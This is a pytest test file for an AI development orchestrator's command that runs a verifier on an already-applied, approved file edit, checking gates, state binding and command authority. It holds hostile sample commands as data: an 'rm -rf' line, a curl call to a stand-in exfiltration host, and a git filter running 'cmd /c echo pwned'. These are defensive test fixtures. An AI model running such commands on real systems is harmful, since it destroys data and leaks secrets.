"""Phase 5F2D tests: ``l2-verify-approved-file-edit`` and its verifier.

This is the first command in this repository that executes repository-controlled
code, so these tests are organized around the one positive capability and the
fences around it:

1. **Gates** — every way the command must fail before it reads anything, touches
   a workspace, or launches a process.
2. **State binding** — verification runs against the exact already-applied
   approved change, and nothing else.
3. **Command authority** — the executable and args come only from project
   config; the plan's ``required_verification`` never does, and the CLI offers no
   way to supply one.
4. **Execution** — one bounded invocation, its outcomes, and its output.
5. **Postcondition** — the Git-visible workspace state is re-proved afterwards,
   and a changed workspace is exit 3, never "verification failed".
6. **Absent capabilities** — no model, no GitHub, no branch/commit/push/PR, no
   retry, no repair, no ``git restore``.

**Every repository used here is a synthetic Git repository created under
pytest's own ``tmp_path``, and every verification program is a small synthetic
Python script written under ``tmp_path``.** No real target project is used, read,
written, or executed by any test in this file.
"""

from __future__ import annotations

import copy
import hashlib
import json
import os
import shutil
import socket
import subprocess
import sys
import textwrap
import time
from pathlib import Path

import pytest
from typer.testing import CliRunner

from ai_dev_orchestrator import cli
from ai_dev_orchestrator.cli import app
from ai_dev_orchestrator.diff_proposal import (
    DIFF_PROPOSAL_MODE,
    DIFF_PROPOSAL_SCHEMA_VERSION,
)
from ai_dev_orchestrator.file_editing import (
    APPROVED_DIFF_PROPOSAL_MODE,
    APPROVED_DIFF_PROPOSAL_SCHEMA_VERSION,
    REQUIRED_DIFF_EDIT_APPROVAL_TEXT,
)
from ai_dev_orchestrator.handoff import REQUIRED_APPROVAL_TEXT
from ai_dev_orchestrator.verification import VerificationResultReport
from ai_dev_orchestrator.verification import runner as runner_module
from ai_dev_orchestrator.verification import verifier as verifier_module
from ai_dev_orchestrator.workspace import FIXED_GIT_OPERATIONS

runner = CliRunner()

windows_only = pytest.mark.skipif(
    sys.platform != "win32", reason="Phase 5F2D verifies a Windows-only writer"
)
git_required = pytest.mark.skipif(
    shutil.which("git") is None, reason="git is not installed"
)

PROJECT_ID = "demo_project"
REPO = "demo/widgets"
ISSUE_NUMBER = 42
TITLE = "Round invoice totals to two decimal places"
APPROVER = "operator@example.invalid"

TARGET = "src/billing/totals.py"
SECOND_TARGET = "src/billing/tax.py"
NEW_FILE = "src/billing/new_helper.py"
PROTECTED_TARGET = "src/billing/protected_secrets.py"
FORBIDDEN_TARGET = "secrets/keys.env"
UNLISTED_TARGET = "docs/notes.md"
OUT_OF_SCOPE = "external/other.py"

ORIGINAL_TEXT = (
    "def format_total(amount):\n"
    "    return str(amount)\n"
    "\n"
    "\n"
    "def total(items):\n"
    "    return sum(items)\n"
)
PROPOSED_TEXT = (
    "def format_total(amount):\n"
    '    return f"{amount:.2f}"\n'
    "\n"
    "\n"
    "def total(items):\n"
    "    return sum(items)\n"
)

SECOND_ORIGINAL = "TAX_RATE = 0.2\n"

# A deliberately hostile plan field. Phase 5F2D must never split it, parse it,
# turn it into argv, or run it — so it names a marker file that must never
# appear, and a token that must never reach a command line.
SENTINEL_MARKER = "AIDO_SENTINEL_REQUIRED_VERIFICATION_RAN.txt"
SENTINEL_REQUIRED_VERIFICATION = [
    f"python -c \"open(r'{SENTINEL_MARKER}','w').write('ran')\"",
    "rm -rf SENTINEL_DESTRUCTIVE",
    "curl http://sentinel.invalid/exfiltrate",
]

CONFIG_TEMPLATE = """\
project_id: {project_id}
display_name: Demo Project
repo:
  workspace_path: {workspace_path}
  github_repo: {github_repo}
  default_base_branch: main
  branch_prefix: ai/demo
workspace_policy:
  deny_outside_workspace: {deny_outside_workspace}
  allow_symlinks: {allow_symlinks}
  max_changed_files: {max_changed_files}
workspace_write:
  enabled: true
  max_file_bytes: {max_file_bytes}
controlled_verification:
  enabled: {verify_enabled}
  executable: {executable}
  args: {args}
  timeout_seconds: {timeout_seconds}
  max_output_bytes: {max_output_bytes}
allowed_paths:
  - "src/**"
  - "tests/**"
  - "docs/allowed/**"
protected_paths:
  - "src/billing/protected_*.py"
forbidden_paths:
  - ".git/**"
  - "secrets/**"
"""


# -- Synthetic repository ------------------------------------------------------


def _run_git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


def _make_repo(tmp_path: Path, files: dict[str, str] | None = None) -> Path:
    """Create one synthetic Git repository under ``tmp_path``.

    Deliberately never a real project: the whole repository is created, written,
    committed and inspected inside pytest's own temporary directory.
    """
    repo = tmp_path / "workspace"
    repo.mkdir()
    _run_git(repo, "init", "-q")
    for key, value in (
        ("user.name", "AIDO Test"),
        ("user.email", "aido-test@example.invalid"),
        ("commit.gpgsign", "false"),
        ("core.autocrlf", "false"),
    ):
        _run_git(repo, "config", key, value)

    payload = {TARGET: ORIGINAL_TEXT, SECOND_TARGET: SECOND_ORIGINAL}
    if files is not None:
        payload = files
    for relative, content in payload.items():
        destination = repo / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(content.encode("utf-8"))

    _run_git(repo, "add", "-A")
    _run_git(repo, "commit", "-q", "-m", "initial")
    return repo


def _apply_approved_change(repo: Path, text: str = PROPOSED_TEXT) -> None:
    """Put the repository into exactly the state Phase 5F2C leaves behind."""
    (repo / TARGET).write_bytes(text.encode("utf-8"))


# -- Synthetic verification programs -------------------------------------------


def _script(tmp_path: Path, name: str, body: str) -> Path:
    """Write one synthetic verification program **outside** the repository."""
    scripts = tmp_path / "scripts"
    scripts.mkdir(exist_ok=True)
    path = scripts / name
    path.write_text(textwrap.dedent(body), encoding="utf-8")
    return path


PASSING_BODY = """
import sys
sys.stdout.write("collected 3 items\\n3 passed\\n")
sys.exit(0)
"""

FAILING_BODY = """
import sys
sys.stdout.write("collected 3 items\\n")
sys.stderr.write("E   assert 1 == 2\\n")
sys.stdout.write("1 failed, 2 passed\\n")
sys.exit(1)
"""


# -- Artifact construction -----------------------------------------------------


def _sha(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def _unified_diff(path: str, original: str, proposed: str) -> str:
    import difflib

    return "\n".join(
        difflib.unified_diff(
            original.splitlines(),
            proposed.splitlines(),
            fromfile=f"a/{path}",
            tofile=f"b/{path}",
            lineterm="",
        )
    )


def _plan(files_likely: list[str] | None = None) -> dict:
    return {
        "issue_number": ISSUE_NUMBER,
        "repo": REPO,
        "title": TITLE,
        "summary": "Format invoice totals through one shared helper.",
        "scope_summary": "Only the billing formatting helper.",
        "non_goals": ["No changes to the payment gateway client."],
        "proposed_steps": ["Round totals to two decimal places."],
        "files_likely_to_change": files_likely
        or [
            TARGET,
            SECOND_TARGET,
            NEW_FILE,
            PROTECTED_TARGET,
            FORBIDDEN_TARGET,
            UNLISTED_TARGET,
        ],
        "files_forbidden_or_out_of_scope": [OUT_OF_SCOPE],
        "required_verification": list(SENTINEL_REQUIRED_VERIFICATION),
        "risks": ["Rounding differences on reissued invoices."],
        "open_questions": [],
        "automation_level": "L1",
        "requires_human_approval": True,
    }


def _approved_plan(files_likely: list[str] | None = None) -> dict:
    return {
        "approval": {
            "approved_by": APPROVER,
            "approved_at": "2026-01-02T04:00:00+00:00",
            "approval_text": REQUIRED_APPROVAL_TEXT,
            "source": "manual",
        },
        "plan_provenance": {
            "engine": "deterministic",
            "operation": "l1-plan",
            "real_call": False,
            "model": None,
            "endpoint_host": None,
            "generated_at": "2026-01-02T03:04:05+00:00",
            "project_id": PROJECT_ID,
            "repo": REPO,
            "issue_number": ISSUE_NUMBER,
            "title": TITLE,
        },
        "plan": _plan(files_likely),
        "project_id": PROJECT_ID,
        "repo": REPO,
        "issue_number": ISSUE_NUMBER,
    }


def _change(
    path: str = TARGET,
    original: str = ORIGINAL_TEXT,
    proposed: str = PROPOSED_TEXT,
    change_type: str = "modify",
    **overrides,
) -> dict:
    if change_type == "create":
        diff = "\n".join(
            [
                "--- /dev/null",
                f"+++ b/{path}",
                f"@@ -0,0 +1,{len(proposed.splitlines())} @@",
                *[f"+{line}" for line in proposed.splitlines()],
            ]
        )
        pre = None
    else:
        diff = _unified_diff(path, original, proposed)
        pre = _sha(original)
    change = {
        "path": path,
        "change_type": change_type,
        "unified_diff": diff,
        "pre_image_sha256": pre,
        "post_image_sha256": _sha(proposed),
        "rationale": "Round invoice totals to two decimal places.",
        "risks": ["Reissued invoices may differ by a cent."],
        "requires_human_review": True,
    }
    change.update(overrides)
    return change


def _artifact(
    changes: list[dict] | None = None,
    files_likely: list[str] | None = None,
    **overrides,
) -> dict:
    proposal = {
        "schema_version": DIFF_PROPOSAL_SCHEMA_VERSION,
        "mode": DIFF_PROPOSAL_MODE,
        "provenance": {
            "engine": "deterministic",
            "operation": "diff-proposal",
            "real_call": False,
            "model": None,
            "generated_at": None,
            "project_id": PROJECT_ID,
            "repo": REPO,
            "issue_number": ISSUE_NUMBER,
            "title": TITLE,
        },
        "approved_plan": _approved_plan(files_likely),
        "patch_proposal": None,
        "changes": copy.deepcopy(changes) if changes is not None else [_change()],
        "omitted_paths": [],
        "assumptions": [],
        "risks": [],
        "open_questions": [],
        "source_contents_read": True,
        "diffs_generated": True,
        "files_edited": False,
        "commands_run": False,
        "applies_cleanly_checked": False,
        "requires_human_review": True,
        "next_authorization_required": "A writer must be authorized separately.",
    }
    payload = {
        "schema_version": APPROVED_DIFF_PROPOSAL_SCHEMA_VERSION,
        "mode": APPROVED_DIFF_PROPOSAL_MODE,
        "approval": {
            "approved_by": APPROVER,
            "approved_at": "2026-01-04T06:00:00+00:00",
            "approval_text": REQUIRED_DIFF_EDIT_APPROVAL_TEXT,
            "source": "manual",
        },
        "diff_proposal": proposal,
        "project_id": PROJECT_ID,
        "repo": REPO,
        "issue_number": ISSUE_NUMBER,
        "title": TITLE,
        "next_authorization_required": "Reviewer integration remains unauthorized.",
    }
    payload.update(overrides)
    return payload


def _write_config(
    tmp_path: Path,
    workspace: Path | str,
    *,
    verify_enabled: bool = True,
    executable: str | None = None,
    args: list[str] | None = None,
    timeout_seconds: int = 60,
    max_output_bytes: int = 200_000,
    max_changed_files: int = 20,
    max_file_bytes: int = 200_000,
    allow_symlinks: bool = False,
    deny_outside_workspace: bool = True,
    project_id: str = PROJECT_ID,
    github_repo: str = REPO,
    name: str = "project.yaml",
) -> Path:
    path = tmp_path / name
    path.write_text(
        CONFIG_TEMPLATE.format(
            project_id=project_id,
            workspace_path=json.dumps(str(workspace)),
            github_repo=github_repo,
            deny_outside_workspace=str(deny_outside_workspace).lower(),
            allow_symlinks=str(allow_symlinks).lower(),
            max_changed_files=max_changed_files,
            max_file_bytes=max_file_bytes,
            verify_enabled=str(verify_enabled).lower(),
            executable=json.dumps(executable) if executable else "null",
            args=json.dumps(args or []),
            timeout_seconds=timeout_seconds,
            max_output_bytes=max_output_bytes,
        ),
        encoding="utf-8",
    )
    return path


def _write_artifact(
    tmp_path: Path, artifact: dict, name: str = "approved.json"
) -> Path:
    path = tmp_path / name
    path.write_text(json.dumps(artifact), encoding="utf-8")
    return path


def _invoke(config: Path, artifact: Path, *extra: str):
    return runner.invoke(
        app,
        [
            "l2-verify-approved-file-edit",
            "--project-config",
            str(config),
            "--approved-diff-proposal",
            str(artifact),
            "--apply-approved-plan",
            "--verify-approved-file-edit",
            *extra,
        ],
    )


def _setup(
    tmp_path: Path,
    *,
    artifact: dict | None = None,
    body: str = PASSING_BODY,
    script_name: str = "verify.py",
    apply_change: bool = True,
    extra_args: list[str] | None = None,
    **config_kwargs,
):
    """One synthetic repo, one applied approved change, one synthetic verifier."""
    repo = _make_repo(tmp_path)
    if apply_change:
        _apply_approved_change(repo)

    inputs = tmp_path / "inputs"
    inputs.mkdir(exist_ok=True)

    script = _script(tmp_path, script_name, body)
    config_kwargs.setdefault("executable", sys.executable)
    config_kwargs.setdefault("args", [str(script), *(extra_args or [])])

    config = _write_config(inputs, repo, **config_kwargs)
    artifact_path = _write_artifact(inputs, artifact if artifact else _artifact())
    return repo, config, artifact_path


def _report(result) -> dict:
    return json.loads(result.stdout)


# =============================================================================
# 1. Gates that must fail before anything is read, touched, or launched
# =============================================================================


def test_missing_both_action_flags_reads_nothing(tmp_path, monkeypatch):
    def boom(*args, **kwargs):
        raise AssertionError("a file was read without both action flags")

    monkeypatch.setattr(Path, "read_text", boom)

    result = runner.invoke(
        app,
        [
            "l2-verify-approved-file-edit",
            "--project-config",
            str(tmp_path / "nonexistent.yaml"),
            "--approved-diff-proposal",
            str(tmp_path / "nonexistent.json"),
        ],
    )
    assert result.exit_code != 0


@git_required
@pytest.mark.parametrize(
    "flags", [["--apply-approved-plan"], ["--verify-approved-file-edit"], []]
)
def test_either_action_flag_alone_reads_nothing_and_launches_nothing(
    tmp_path, monkeypatch, flags
):
    repo, config, artifact = _setup(tmp_path)

    reads: list[str] = []
    original_read_text = Path.read_text

    def tracking(self, *args, **kwargs):
        reads.append(str(self))
        return original_read_text(self, *args, **kwargs)

    monkeypatch.setattr(Path, "read_text", tracking)
    monkeypatch.setattr(
        subprocess,
        "Popen",
        lambda *a, **k: (_ for _ in ()).throw(
            AssertionError("a process was started without both action flags")
        ),
    )

    result = runner.invoke(
        app,
        [
            "l2-verify-approved-file-edit",
            "--project-config",
            str(config),
            "--approved-diff-proposal",
            str(artifact),
            *flags,
        ],
    )

    assert result.exit_code == 1
    assert reads == []


@git_required
def test_controlled_verification_disabled_launches_nothing(tmp_path, monkeypatch):
    repo, config, artifact = _setup(tmp_path, verify_enabled=False)

    monkeypatch.setattr(
        subprocess,
        "Popen",
        lambda *a, **k: (_ for _ in ()).throw(
            AssertionError("a process was started while verification was disabled")
        ),
    )

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "controlled_verification" in result.output


@git_required
def test_an_absent_controlled_verification_block_is_identical_to_disabled(tmp_path):
    repo = _make_repo(tmp_path)
    _apply_approved_change(repo)
    inputs = tmp_path / "inputs"
    inputs.mkdir()
    config = inputs / "project.yaml"
    config.write_text(
        "project_id: %s\n"
        "display_name: Demo\n"
        "repo:\n"
        "  workspace_path: %s\n"
        "  github_repo: %s\n"
        "  branch_prefix: ai/demo\n"
        'allowed_paths: ["src/**"]\n' % (PROJECT_ID, json.dumps(str(repo)), REPO),
        encoding="utf-8",
    )
    artifact = _write_artifact(inputs, _artifact())

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert result.stdout == ""


@git_required
def test_non_windows_refuses_before_any_workspace_touch(tmp_path, monkeypatch):
    repo, config, artifact = _setup(tmp_path)

    monkeypatch.setattr(cli.sys, "platform", "linux")
    monkeypatch.setattr(
        subprocess,
        "Popen",
        lambda *a, **k: (_ for _ in ()).throw(
            AssertionError("a process was started on an unsupported platform")
        ),
    )

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "Windows-only" in result.output


@git_required
def test_artifact_inside_the_workspace_is_refused_before_it_is_read(
    tmp_path, monkeypatch
):
    repo = _make_repo(tmp_path)
    _apply_approved_change(repo)
    inputs = tmp_path / "inputs"
    inputs.mkdir()
    script = _script(tmp_path, "verify.py", PASSING_BODY)
    config = _write_config(
        inputs, repo, executable=sys.executable, args=[str(script)]
    )
    inside = repo / "approved.json"
    inside.write_text(json.dumps(_artifact()), encoding="utf-8")

    original_read_text = Path.read_text

    def tracking(self, *args, **kwargs):
        assert "approved.json" not in str(self), "the in-workspace artifact was read"
        return original_read_text(self, *args, **kwargs)

    monkeypatch.setattr(Path, "read_text", tracking)

    result = _invoke(config, inside)

    assert result.exit_code == 1
    assert "workspace_path" in result.output


@windows_only
@git_required
def test_identity_mismatch_is_refused(tmp_path):
    repo, config, artifact = _setup(tmp_path, github_repo="someone/else")

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "identity error" in result.output


@windows_only
@git_required
@pytest.mark.parametrize("count", [0, 2])
def test_anything_other_than_exactly_one_change_is_refused(tmp_path, count):
    changes = [_change(), _change(path=SECOND_TARGET, original=SECOND_ORIGINAL,
                                  proposed="TAX_RATE = 0.25\n")][:count]
    repo, config, artifact = _setup(tmp_path, artifact=_artifact(changes=changes))

    result = _invoke(config, artifact)

    assert result.exit_code == 1


@windows_only
@git_required
def test_a_create_change_is_refused(tmp_path):
    artifact = _artifact(
        changes=[_change(path=NEW_FILE, change_type="create", proposed="X = 1\n")]
    )
    repo, config, artifact_path = _setup(tmp_path, artifact=artifact)

    result = _invoke(config, artifact_path)

    assert result.exit_code == 1
    assert "modify" in result.output


@windows_only
@git_required
@pytest.mark.parametrize(
    "path", [PROTECTED_TARGET, FORBIDDEN_TARGET, UNLISTED_TARGET]
)
def test_protected_forbidden_and_unlisted_targets_are_refused(tmp_path, path):
    artifact = _artifact(changes=[_change(path=path)])
    repo, config, artifact_path = _setup(tmp_path, artifact=artifact)

    result = _invoke(config, artifact_path)

    assert result.exit_code == 1
    assert "policy error" in result.output


@windows_only
@git_required
@pytest.mark.parametrize(
    "flags", [{"allow_symlinks": True}, {"deny_outside_workspace": False}]
)
def test_a_symlink_or_containment_policy_mismatch_is_refused(tmp_path, flags):
    repo, config, artifact = _setup(tmp_path, **flags)

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "policy error" in result.output


# =============================================================================
# 2. Pre-execution state binding
# =============================================================================


@windows_only
@git_required
def test_a_repo_with_no_applied_change_refuses_and_launches_nothing(
    tmp_path, monkeypatch
):
    """The target still holds the pre-image, so the post-image binding refuses."""
    repo, config, artifact = _setup(tmp_path, apply_change=False)

    launched = []
    real_popen = subprocess.Popen
    monkeypatch.setattr(
        subprocess,
        "Popen",
        lambda argv, **k: (launched.append(argv), real_popen(argv, **k))[1],
    )

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "post_image_sha256" in result.output
    # Only Git inspection ran; the configured verification program did not.
    assert all(argv[0] != sys.executable for argv in launched)


@windows_only
@git_required
def test_a_clean_repo_whose_change_was_committed_refuses(tmp_path):
    """Post-image present is not enough: it must be present as the dirty change.

    Committing the approved modification makes the working tree clean, and a
    clean tree means there is no applied-but-unreviewed change to verify. This
    phase verifies an already-applied approved change; it does not apply one, and
    it does not verify an unchanged repository.
    """
    repo, config, artifact = _setup(tmp_path)
    _run_git(repo, "commit", "-q", "-am", "committed the approved change")

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "clean" in result.output


@windows_only
@git_required
def test_a_target_dirty_with_the_wrong_bytes_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path, apply_change=False)
    (repo / TARGET).write_bytes(b"something else entirely\n")

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "post_image_sha256" in result.output


@windows_only
@git_required
def test_the_pre_image_is_not_good_enough(tmp_path):
    """Verification binds to the post-image, never to the file it started from."""
    repo, config, artifact = _setup(tmp_path, apply_change=False)
    (repo / TARGET).write_bytes(ORIGINAL_TEXT.encode("utf-8"))

    result = _invoke(config, artifact)

    assert result.exit_code == 1


@windows_only
@git_required
def test_a_second_dirty_file_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    (repo / SECOND_TARGET).write_bytes(b"TAX_RATE = 0.9\n")

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "not exactly the one approved path" in result.output


@windows_only
@git_required
def test_a_staged_approved_target_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    _run_git(repo, "add", TARGET)

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "unstaged modification" in result.output


@windows_only
@git_required
def test_an_untracked_extra_file_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    (repo / "src" / "billing" / "scratch.py").write_bytes(b"# scratch\n")

    result = _invoke(config, artifact)

    assert result.exit_code == 1


@windows_only
@git_required
def test_a_deleted_tracked_file_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    (repo / SECOND_TARGET).unlink()

    result = _invoke(config, artifact)

    assert result.exit_code == 1


@windows_only
@git_required
def test_a_renamed_tracked_file_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    _run_git(repo, "mv", SECOND_TARGET, "src/billing/tax_renamed.py")

    result = _invoke(config, artifact)

    assert result.exit_code == 1


@windows_only
@git_required
def test_assume_unchanged_anywhere_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    _run_git(repo, "update-index", "--assume-unchanged", SECOND_TARGET)

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "assume-unchanged" in result.output


@windows_only
@git_required
def test_skip_worktree_anywhere_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    _run_git(repo, "update-index", "--skip-worktree", SECOND_TARGET)

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "skip-worktree" in result.output


@windows_only
@git_required
def test_an_unmerged_conflict_state_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path, apply_change=False)

    _run_git(repo, "checkout", "-q", "-b", "side")
    (repo / SECOND_TARGET).write_bytes(b"TAX_RATE = 0.3\n")
    _run_git(repo, "commit", "-q", "-am", "side")
    _run_git(repo, "checkout", "-q", "-")
    (repo / SECOND_TARGET).write_bytes(b"TAX_RATE = 0.4\n")
    _run_git(repo, "commit", "-q", "-am", "main")
    merge = subprocess.run(["git", "merge", "side"], cwd=repo, capture_output=True)
    assert merge.returncode != 0
    _apply_approved_change(repo)

    result = _invoke(config, artifact)

    assert result.exit_code == 1


@windows_only
@git_required
def test_a_gitlink_submodule_entry_refuses_the_whole_repository(tmp_path):
    repo, config, artifact = _setup(tmp_path, apply_change=False)

    other = tmp_path / "other"
    other.mkdir()
    _run_git(other, "init", "-q")
    for key, value in (
        ("user.name", "AIDO Test"),
        ("user.email", "aido-test@example.invalid"),
        ("commit.gpgsign", "false"),
    ):
        _run_git(other, "config", key, value)
    (other / "f.txt").write_bytes(b"x\n")
    _run_git(other, "add", "-A")
    _run_git(other, "commit", "-q", "-m", "init")

    added = subprocess.run(
        ["git", "-c", "protocol.file.allow=always", "submodule", "add", "-q",
         str(other).replace("\\", "/"), "vendor/other"],
        cwd=repo,
        capture_output=True,
    )
    if added.returncode != 0:
        pytest.skip("this git refuses local submodule addition")
    _run_git(repo, "commit", "-q", "-m", "add submodule")
    _apply_approved_change(repo)

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "gitlink" in result.output or "submodule" in result.output


@windows_only
@git_required
def test_a_repository_whose_git_config_can_execute_a_program_is_refused(tmp_path):
    repo, config, artifact = _setup(tmp_path)
    _run_git(repo, "config", "filter.evil.clean", "cmd /c echo pwned")

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "filter.evil.clean" in result.output


@windows_only
@git_required
def test_a_workspace_that_is_not_the_git_top_level_refuses(tmp_path):
    repo = _make_repo(tmp_path)
    _apply_approved_change(repo)
    inputs = tmp_path / "inputs"
    inputs.mkdir()
    script = _script(tmp_path, "verify.py", PASSING_BODY)
    # Configure a subdirectory of the repository as the workspace root.
    config = _write_config(
        inputs,
        repo / "src",
        executable=sys.executable,
        args=[str(script)],
    )
    artifact = _write_artifact(inputs, _artifact())

    result = _invoke(config, artifact)

    assert result.exit_code == 1


# =============================================================================
# 3. Command authority
# =============================================================================


@windows_only
@git_required
def test_the_executable_and_args_come_only_from_project_config(tmp_path, monkeypatch):
    script = _script(tmp_path, "verify.py", PASSING_BODY)
    repo, config, artifact = _setup(
        tmp_path, extra_args=["--flag-from-config", "value-from-config"]
    )

    seen: list[tuple] = []
    real_popen = subprocess.Popen

    def recording(argv, **kwargs):
        seen.append(tuple(argv))
        return real_popen(argv, **kwargs)

    monkeypatch.setattr(subprocess, "Popen", recording)

    result = _invoke(config, artifact)
    assert result.exit_code == 0

    verification_argvs = [argv for argv in seen if argv[0] == sys.executable]
    assert len(verification_argvs) == 1
    argv = verification_argvs[0]
    assert argv[0] == sys.executable
    assert argv[1].endswith("verify.py")
    assert argv[2:] == ("--flag-from-config", "value-from-config")


@windows_only
@git_required
def test_the_plan_required_verification_is_never_executed(tmp_path, monkeypatch):
    repo, config, artifact = _setup(tmp_path)

    seen: list[tuple] = []
    real_popen = subprocess.Popen

    def recording(argv, **kwargs):
        seen.append(tuple(argv))
        return real_popen(argv, **kwargs)

    monkeypatch.setattr(subprocess, "Popen", recording)

    result = _invoke(config, artifact)
    assert result.exit_code == 0

    # Not one token of the sentinel reached any argv this run produced.
    flat = " ".join(part for argv in seen for part in argv)
    for entry in SENTINEL_REQUIRED_VERIFICATION:
        assert entry not in flat
        for token in entry.split():
            if token in ("python", "-c"):
                continue
            assert token not in flat, token
    assert "curl" not in flat
    assert "rm" not in flat.split()

    # And it did not run by any other route.
    assert not (repo / SENTINEL_MARKER).exists()
    assert not (Path.cwd() / SENTINEL_MARKER).exists()

    report = _report(result)
    assert report["command"]["plan_required_verification_executed"] is False
    assert report["command"]["plan_required_verification_entries"] == len(
        SENTINEL_REQUIRED_VERIFICATION
    )
    assert report["command"]["args_source"] == "project_config"
    assert report["command"]["executable_source"] == "project_config"


@windows_only
@git_required
def test_a_hostile_required_verification_changes_nothing_about_the_argv(tmp_path):
    """Two artifacts differing only in required_verification produce one argv."""
    benign = _artifact()
    benign["diff_proposal"]["approved_plan"]["plan"]["required_verification"] = [
        "pytest -q"
    ]

    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    repo_a, config_a, artifact_a = _setup(tmp_path / "a", artifact=benign)
    repo_b, config_b, artifact_b = _setup(tmp_path / "b", artifact=_artifact())

    result_a = _invoke(config_a, artifact_a)
    result_b = _invoke(config_b, artifact_b)

    assert result_a.exit_code == 0
    assert result_b.exit_code == 0
    assert _report(result_a)["command"]["arg_count"] == (
        _report(result_b)["command"]["arg_count"]
    )


@pytest.mark.parametrize(
    "option",
    [
        "--command",
        "--executable",
        "--args",
        "--shell",
        "--verification",
        "--force",
        "--repair",
        "--retry",
        "--commit",
        "--push",
        "--pr",
        "--model",
    ],
)
def test_no_command_injection_option_exists(tmp_path, option):
    result = runner.invoke(
        app,
        [
            "l2-verify-approved-file-edit",
            "--project-config",
            str(tmp_path / "nope.yaml"),
            "--approved-diff-proposal",
            str(tmp_path / "nope.json"),
            "--apply-approved-plan",
            "--verify-approved-file-edit",
            option,
            "anything",
        ],
    )

    assert result.exit_code != 0
    assert "No such option" in result.output or "Error" in result.output


def test_the_command_declares_exactly_five_options_and_no_more():
    """Asserted against the declared parameters, not the rendered help text.

    Rendered help wraps and abbreviates; the parameter list is the actual
    surface. Five options, none of which can contribute a token to an argv.
    """
    typer_command = next(
        info
        for info in app.registered_commands
        if info.name == "l2-verify-approved-file-edit"
    )
    declared = {
        option
        for parameter in typer_command.callback.__defaults__
        if getattr(parameter, "param_decls", None)
        for option in parameter.param_decls
    }

    assert declared == {
        "--project-config",
        "--approved-diff-proposal",
        "--apply-approved-plan",
        "--verify-approved-file-edit",
        "--format",
    }
    for forbidden in (
        "--command",
        "--executable",
        "--args",
        "--shell",
        "--verification",
        "--force",
        "--repair",
        "--retry",
        "--commit",
        "--push",
        "--pr",
        "--model",
    ):
        assert forbidden not in declared, forbidden


@windows_only
@git_required
def test_a_missing_configured_executable_refuses(tmp_path):
    repo, config, artifact = _setup(
        tmp_path, executable=str(tmp_path / "nowhere" / "python.exe")
    )

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "does not exist" in result.output


@windows_only
@git_required
def test_an_unset_configured_executable_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path, executable=None, args=[])

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "no default executable" in result.output


@windows_only
@git_required
def test_a_relative_configured_executable_refuses(tmp_path):
    repo, config, artifact = _setup(tmp_path, executable="python.exe", args=[])

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "absolute path" in result.output


@windows_only
@git_required
def test_a_directory_configured_executable_refuses(tmp_path):
    directory = tmp_path / "a_directory"
    directory.mkdir()
    repo, config, artifact = _setup(tmp_path, executable=str(directory), args=[])

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "not a regular file" in result.output


@windows_only
@git_required
def test_a_workspace_local_executable_refuses(tmp_path):
    repo = _make_repo(tmp_path)
    _apply_approved_change(repo)
    inputs = tmp_path / "inputs"
    inputs.mkdir()

    local = repo / ".venv" / "Scripts"
    local.mkdir(parents=True)
    candidate = local / "python.exe"
    shutil.copyfile(sys.executable, candidate)

    config = _write_config(inputs, repo, executable=str(candidate), args=[])
    artifact = _write_artifact(inputs, _artifact())

    result = _invoke(config, artifact)

    assert result.exit_code == 1
    assert "inside the target workspace" in result.output


@windows_only
@git_required
def test_the_child_runs_with_no_shell_in_the_workspace_root_with_devnull_stdin(
    tmp_path, monkeypatch
):
    # The child reports *presence*, not the names or values, so the report's own
    # mandatory redaction cannot obscure what this test is asserting.
    body = """
        import os, sys
        sys.stdout.write("CWD=" + os.getcwd() + "\\n")
        sys.stdout.write("STDIN=%d\\n" % len(sys.stdin.read()))
        leaked = [
            name for name in os.environ
            if name.upper().startswith("AIDO_") or name.upper() == "GITHUB_TOKEN"
        ]
        sys.stdout.write("ENVCHECK leaked=%d\\n" % len(leaked))
    """
    monkeypatch.setenv("AIDO_LITELLM_API_KEY", "sk-never-forwarded-abcdefgh")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_never_forwarded")
    repo, config, artifact = _setup(tmp_path, body=body)

    seen: dict = {}
    real_popen = subprocess.Popen

    def recording(argv, **kwargs):
        if argv[0] == sys.executable:
            seen.update(kwargs)
        return real_popen(argv, **kwargs)

    monkeypatch.setattr(subprocess, "Popen", recording)

    result = _invoke(config, artifact)
    assert result.exit_code == 0

    assert seen["shell"] is False
    assert seen["stdin"] is subprocess.DEVNULL
    assert os.path.normcase(os.path.realpath(seen["cwd"])) == os.path.normcase(
        os.path.realpath(str(repo))
    )

    text = _report(result)["output"]["combined_text"]
    assert "STDIN=0" in text
    assert "ENVCHECK leaked=0" in text
    assert "sk-never-forwarded" not in text
    assert "ghp_never_forwarded" not in text


# =============================================================================
